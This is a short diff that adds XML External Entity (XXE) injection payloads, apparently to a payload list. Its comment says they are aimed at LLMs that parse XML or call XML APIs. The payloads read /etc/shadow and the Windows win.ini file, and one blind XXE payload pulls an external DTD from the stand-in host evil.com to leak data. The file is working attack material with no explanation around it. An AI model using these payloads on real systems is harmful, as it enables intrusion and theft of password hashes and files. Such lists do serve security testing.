@@ -1,0 +1,12 @@
+<!-- XXE for LLMs that parse XML, or call XML APIs -->
+<?xml version="1.0" ?>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<foo>&xxe;</foo>
+
+<!-- Blind XXE -->
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://evil.com/xxe.dtd">%ext;]><root/>
+
+<!-- XXE for Windows file leak -->
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY win SYSTEM "file:///C:/Windows/win.ini"> ]>
+<data>&win;</data>
